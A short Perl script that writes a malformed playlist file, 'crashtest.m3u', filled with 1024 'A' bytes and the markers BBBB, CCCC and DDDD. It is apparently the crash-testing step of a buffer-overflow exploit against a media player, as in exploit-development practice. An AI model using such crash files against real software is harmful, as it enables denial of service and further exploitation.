$file= "crashtest.m3u";
$junk1 = "A" x 1024;
$junk1 .= "BBBB";
$junk1 .= "CCCC";
$junk1 .= "DDDD";
open($FILE,">$file");
print $FILE $junk1;
close($FILE);
